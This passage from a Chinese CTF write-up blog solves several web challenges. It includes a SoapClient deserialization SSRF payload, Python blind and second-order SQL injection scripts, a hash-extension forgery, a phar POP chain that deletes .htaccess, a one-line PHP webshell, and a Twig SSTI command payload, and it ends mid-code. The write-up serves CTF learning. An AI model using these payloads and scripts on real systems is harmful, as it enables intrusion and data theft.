<p>我们可以看到代码中的<code>session_start()</code>十分突兀, 可以说没有啥用, 那应该就是突破口, 在php中, session的存储位置是在文件中, 并且有一次反序列化的过程, 这就有了session反序列化的漏洞</p>
<p>php的反序列化引擎有三种</p>
<ul>
<li><p>php:</p>
<p>  </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name|s:5:"Smi1e";</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
<li><p>php_serialize:</p>
<p>  </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:{s:4:"name";s:5:"Smi1e";}</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
<li><p>php_binary:</p>
<p>  </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><0x04>names:5:"Smi1e";</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
</ul>
<p>可以看到不同的引擎的反序列化方式不同, 类似于反序列化字符串逃逸, 如果使用了不同的引擎, 也可能出现反序列化逃逸, 例如</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:{s:4:"name";s:5:"|O:5:"Smi1e":1:{s:4:"test";s:3:"AAA";}";}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>在<code>php</code>引擎中会从<code>|</code>分隔, <code>a:1:{s:4:"name";s:5:"</code>作为key, <code>O:5:"Smi1e":1:{s:4:"test";s:3:"AAA";}";}</code>作为value, 最后会把它进行unserialize处理, 这就出现了漏洞</p>
<p>但是空有漏洞也没有用, 我们需要对flag.php进行ssrf, 由于题目没有类对象, 我们需要从原生的类入手</p>
<p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0</a></p>
<p>可以看到<code>SoapClient</code>类就符合这个特点, 所以这里的思路就是</p>
<ol>
<li>生成<code>SoapClient</code>的payload</li>
<li>先设置为<code>php_serialize</code>引擎, 将payload注入</li>
<li>再次访问, 调用<code>SoapClient</code>类中不存在的方法, 触发<code>__call__</code>, 从而实现ssrf</li>
</ol>
<p>一步步来, 首先是生成payload</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">    $path = <span class="hljs-string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">    $o = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">'uri'</span> => $path, <span class="hljs-string">'location'</span> => $path));</span><br><span class="line">    $payload = serialize($o);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"|"</span>.$payload;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>生成</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:10:"SoapClient":4:{s:3:"uri";s:25:"http://127.0.0.1/flag.php";s:8:"location";s:25:"http://127.0.0.1/flag.php";s:15:"_stream_context";i:0;s:13:"_soap_version";i:1;}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后访问</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200217203428.png" alt></p>
<p>再利用<code>call_user_func</code>的特性, 当传入的第一个参数为数组时, 数组的第一个元素作为类名, 第二个元素为方法</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200217203954.png" alt></p>
<p>这里的访问就是</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(array("SoapClient", "welcome_to_the_lctf2018"));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>就会触发<code>__call__</code>, 实现ssrf</p>
<p>最后访问<code>index.php</code>, 将获取到的session填入cookie即可</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200217204307.png" alt></p>
<p>签到题都这么有水平, lctf太顶了</p>
<h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200217231420.png" alt></p>
<p>可以看到有ip, 那么有几种可能</p>
<ul>
<li>SSTI</li>
<li>命令注入</li>
<li>sql注入</li>
</ul>
<p>结合文字应该就是sql注入了, 不过这里注入的情况比较特别, 需要三次访问才会出结果</p>
<ol>
<li>访问, 程序记录IP</li>
<li>第二次访问, 如果不同, 则将上次的IP放入数据库</li>
<li>第三次访问, 如果与第二次相同, 则从数据库查询上次的IP</li>
</ol>
<p>这就是二次注入了, 脚本如下</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">"http://node3.buuoj.cn:25528/"</span></span><br><span class="line">proxies = {</span><br><span class="line">    <span class="hljs-string">"http"</span>: <span class="hljs-string">"127.0.0.1:8080"</span></span><br><span class="line">}</span><br><span class="line">static_headers = {</span><br><span class="line">    <span class="hljs-string">"X-Forwarded-For"</span>: <span class="hljs-string">"111"</span>,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(cur, mid)</span>:</span></span><br><span class="line">    <span class="hljs-comment"># table: F4l9_D4t4B45e</span></span><br><span class="line">    payload = <span class="hljs-string">"-1' and (ascii(substr((select reverse(group_concat(schema_name)) from information_schema.schemata),%d,1))>%d)^'0"</span> % (cur, mid)</span><br><span class="line">    <span class="hljs-comment"># table: F</span></span><br><span class="line">    payload = <span class="hljs-string">"-1' and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='F4l9_D4t4B45e'),%d,1))>%d)^'0"</span> % (cur, mid)</span><br><span class="line">    payload = <span class="hljs-string">"-1' and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='F4l9_D4t4B45e'),%d,1))>%d)^'0"</span> % (cur, mid)</span><br><span class="line">    payload = <span class="hljs-string">"-1' and (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),%d,1))>%d)^'0"</span> % (cur, mid)</span><br><span class="line">    </span><br><span class="line">    headers = {</span><br><span class="line">        <span class="hljs-string">"X-Forwarded-For"</span>: payload,</span><br><span class="line">    }</span><br><span class="line">    res = session.get(url, headers=headers, timeout=<span class="hljs-number">5</span>)</span><br><span class="line">    res = session.get(url, headers=static_headers, timeout=<span class="hljs-number">5</span>)</span><br><span class="line">    res = session.get(url, headers=static_headers, timeout=<span class="hljs-number">5</span>).text</span><br><span class="line">    <span class="hljs-comment"># print(res)</span></span><br><span class="line">    result = re.findall(<span class="hljs-string">"(?<=Last Ip:\s).+\s"</span>, res)[<span class="hljs-number">0</span>].strip()</span><br><span class="line">    <span class="hljs-keyword">if</span> result == <span class="hljs-string">"1"</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line">    <span class="hljs-comment"># print(result)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    flag = <span class="hljs-string">""</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">45</span>, <span class="hljs-number">80</span>):</span><br><span class="line">        end = <span class="hljs-number">127</span></span><br><span class="line">        start = <span class="hljs-number">31</span></span><br><span class="line">        mid = (end + start) // <span class="hljs-number">2</span></span><br><span class="line">        <span class="hljs-keyword">while</span> end > start:</span><br><span class="line">            <span class="hljs-keyword">if</span> test(i, mid):</span><br><span class="line">                start = mid + <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">            mid = (end + start) // <span class="hljs-number">2</span></span><br><span class="line">            sleep(<span class="hljs-number">0.3</span>)</span><br><span class="line">        flag += chr(mid)</span><br><span class="line">        print(flag)</span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    <span class="hljs-comment"># attack()</span></span><br><span class="line">    <span class="hljs-comment"># test()</span></span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>依次注入就完事了, 注意一下<code>sleep</code>的时间, 不然容易断</p>
<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>也是个盲注题, 而且最后的flag位置特别靠后, 建议还是活用<code>reverse()</code></p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><br><span class="line"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">"http://49029690-686c-4f70-816f-a017071f77c6.node3.buuoj.cn/search.php"</span></span><br><span class="line">proxies = {</span><br><span class="line">    <span class="hljs-string">"http"</span>: <span class="hljs-string">"127.0.0.1:8080"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(cur, mid=<span class="hljs-string">""</span>)</span>:</span></span><br><span class="line">    <span class="hljs-comment"># table: F4l9_D4t4B45e</span></span><br><span class="line">    payload = <span class="hljs-string">"0^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)"</span> % (cur, mid)</span><br><span class="line">    payload = <span class="hljs-string">"0^(ascii(substr((select(reverse(group_concat(table_name)))from(information_schema.tables)),%d,1))>%d)"</span> % (cur, mid)</span><br><span class="line">    payload = <span class="hljs-string">"0^(ascii(substr((select(reverse(group_concat(column_name)))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)"</span> % (cur, mid)</span><br><span class="line">    payload = <span class="hljs-string">"0^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)"</span> % (cur, mid)</span><br><span class="line">    res = session.get(<span class="hljs-string">f"<span class="hljs-subst">{url}</span>?id=<span class="hljs-subst">{payload}</span>"</span>, timeout=<span class="hljs-number">5</span>).text</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-string">"Click"</span> <span class="hljs-keyword">in</span> res:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line">    <span class="hljs-comment"># print(result)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    flag = <span class="hljs-string">""</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">172</span>, <span class="hljs-number">220</span>):</span><br><span class="line">        end = <span class="hljs-number">127</span></span><br><span class="line">        start = <span class="hljs-number">31</span></span><br><span class="line">        mid = (end + start) // <span class="hljs-number">2</span></span><br><span class="line">        <span class="hljs-keyword">while</span> end > start:</span><br><span class="line">            <span class="hljs-keyword">if</span> test(i, mid):</span><br><span class="line">                start = mid + <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">            mid = (end + start) // <span class="hljs-number">2</span></span><br><span class="line">            sleep(<span class="hljs-number">0.05</span>)</span><br><span class="line">        flag += chr(mid)</span><br><span class="line">        print(flag)</span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    <span class="hljs-comment"># attack()</span></span><br><span class="line">    <span class="hljs-comment"># test()</span></span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="ByteCTF-2019-EZCMS"><a href="#ByteCTF-2019-EZCMS" class="headerlink" title="[ByteCTF 2019]EZCMS"></a>[ByteCTF 2019]EZCMS</h2><p>第一步是hash拓展攻击</p>
<p>先随便登录一下, 可以在<code>cookie</code>中看到</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash=52107b08c0f3342d2153ae1d68e6262c</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>翻一下源码, 这里是</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$secret = <span class="hljs-string">"E3ry7Hjq"</span>;</span><br><span class="line">setcookie(<span class="hljs-string">"hash"</span>, md5($secret.<span class="hljs-string">"adminadmin"</span>));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>在验证的地方, 验证</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_admin</span><span class="hljs-params">()</span></span>{</span><br><span class="line">    $secret = <span class="hljs-string">"E3ry7Hjq"</span>;</span><br><span class="line">    $username = $_SESSION[<span class="hljs-string">'username'</span>];</span><br><span class="line">    $password = $_SESSION[<span class="hljs-string">'password'</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ($username == <span class="hljs-string">"admin"</span> && $password != <span class="hljs-string">"admin"</span>){</span><br><span class="line">        <span class="hljs-keyword">if</span> ($_COOKIE[<span class="hljs-string">'user'</span>] === md5($secret.$username.$password)){</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>那么只需要在hashpump里面</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218014538.png" alt></p>
<p>然后替换成<code>%</code></p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>登陆后就是admin了</p>
<p>然后继续看源码, 这道题不难看出是个构造pop链的题, 可以看到在config.php里面</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218030727.png" alt></p>
<p><code>File</code>类存在一个<code>__destruct</code></p>
<p>里面会调用<code>check->upload_file</code></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218030817.png" alt></p>
<p>在<code>Profile</code>类中存在一个<code>__call</code>函数, 可以调用<code>admin->open</code>, 那么如果我们能找到某个类的<code>open</code>可以删除文件, 也就是程序默认生成的<code>.htaccess</code>, 就可以RCE了, 这个类就是<code>ZipAchrive</code></p>
<p><a href="https://www.anquanke.com/post/id/95896#h2-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/95896#h2-4</a></p>
<blockquote>
<p>现在，我们在本地去测试每个类的行为。经过一段时间的测试之后，我发现，ZipArchive->open方法可以删除目标文件，前提是我们需要将其第二个参数设定为“9”。</p>
<p>为什么要设定为9呢？原因在于， ZipArchive->open()的第二个参数是“指定其他选项”。而9对应的是ZipArchive::CREATE | ZipArchive::OVERWRITE。由于ZipArchive打算覆盖我们的文件，所以就会先对其进行删除。在此，感谢<a href="https://github.com/pagabuc" target="_blank" rel="noopener">@pagabuc</a>帮助我们解释了这一参数的具体意义。</p>
<p>那么现在，我们就可以使用ZipArchive->open()来删除.htaccess文件。</p>
</blockquote>
<p>构造链如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File -> __destruct -> Profile -> upload_file(不存在) -> __call -> ZipArchive -> open</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>生成的脚本</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>{</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> $filename;</span><br><span class="line">    <span class="hljs-keyword">public</span> $filepath;</span><br><span class="line">    <span class="hljs-keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $size;</span><br><span class="line">    <span class="hljs-keyword">public</span> $checker;</span><br><span class="line">    <span class="hljs-keyword">public</span> $file_tmp;</span><br><span class="line">    <span class="hljs-keyword">public</span> $filename;</span><br><span class="line">    <span class="hljs-keyword">public</span> $upload_dir;</span><br><span class="line">    <span class="hljs-keyword">public</span> $content_check;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $username = <span class="hljs-string">"/var/www/html/sandbox/2c67ca1eaeadbdc1868d67003072b481/.htaccess"</span>;</span><br><span class="line">    <span class="hljs-keyword">public</span> $password = <span class="hljs-string">"9"</span>;</span><br><span class="line">    <span class="hljs-keyword">public</span> $admin;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$z = <span class="hljs-keyword">new</span> ZipArchive();</span><br><span class="line">$p = <span class="hljs-keyword">new</span> Profile();</span><br><span class="line">$p->admin = $z;</span><br><span class="line">$f = <span class="hljs-keyword">new</span> File();</span><br><span class="line">$f->checker = $p;</span><br><span class="line">unlink(<span class="hljs-string">"1.phar"</span>);</span><br><span class="line"></span><br><span class="line">$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">"1.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span></span><br><span class="line">$phar->startBuffering();</span><br><span class="line"><span class="hljs-comment">// <span class="hljs-meta"><?php</span> __HALT_COMPILER();</span></span><br><span class="line">$phar->setStub(<span class="hljs-string">"GIF89a"</span> . <span class="hljs-string">"<?php __HALT_COMPILER(); ?>"</span>); <span class="hljs-comment">//设置stub</span></span><br><span class="line">$phar->setMetadata($f); <span class="hljs-comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar->addFromString(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); </span><br><span class="line">    <span class="hljs-comment">//签名自动计算</span></span><br><span class="line">$phar->stopBuffering();</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>对于如何绕过phar协议的过滤可以看这篇文章 <a href="https://blog.zeddyu.info/2019/08/24/SUCTF-2019/#php-filter" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/08/24/SUCTF-2019/#php-filter</a></p>
<blockquote>
<p>zedd师傅的文章都写的很好</p>
</blockquote>
<p>通过php伪协议来绕过</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>而这里恰好有一个触发的函数</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218022439.png" alt></p>
<p>那么就可以开始了</p>
<ol>
<li><p>生成webshell, 由于<code>eval</code>无法动态构造, 这里就直接这样了</p>
<p> </p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">    ($_GET[<span class="hljs-string">'a'</span>])($_GET[<span class="hljs-string">'b'</span>]);</span><br><span class="line"><span class="hljs-meta">?></span></span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
<li><p>上传webshell</p>
</li>
<li><p>生成我们的phar文件并上传</p>
</li>
<li><p>访问view.php, 这里需要注意phar文件的路径</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://078e3606-5996-4c33-9dff-00db1aaa228f.node3.buuoj.cn/view.php?filename=eec2d95bc618625503306c10fad5d37d.phar&filepath=php://filter/resource=phar://./sandbox/2c67ca1eaeadbdc1868d67003072b481/eec2d95bc618625503306c10fad5d37d.phar</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
<li><p>rce</p>
<p> <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218031421.png" alt></p>
</li>
</ol>
<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>这道题以为他用的是<code>smarty</code>, 还以为他的这句话是用了<code>waf</code></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218033526.png" alt></p>
<p>测了半天发现不靠谱, 原来这是个<code>twig</code></p>
<p>上网抄个payload就可以直接打了….</p>
<p>具体可以看这里</p>
<p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig" target="_blank" rel="noopener">一篇文章带你理解漏洞之SSTI漏洞</a></p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>果然还是要测一测是什么引擎先</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218033905.png" alt></p>
<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span><span class="hljs-params">()</span></span>{</span><br><span class="line">		$chars = <span class="hljs-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-'</span>;</span><br><span class="line">		$random = $chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span></span><br><span class="line">		$content = uniqid().$random;</span><br><span class="line">		<span class="hljs-keyword">return</span> sha1($content); </span><br><span class="line">	}</span><br><span class="line">    header(<span class="hljs-string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'username'</span>]) <span class="hljs-keyword">and</span> $_POST[<span class="hljs-string">'username'</span>] != <span class="hljs-string">''</span> )</span><br><span class="line">    {</span><br><span class="line">        $admin = <span class="hljs-string">'6d0bc1'</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( $admin == substr(md5($_POST[<span class="hljs-string">'password'</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) {</span><br><span class="line">            <span class="hljs-keyword">echo</span> <span 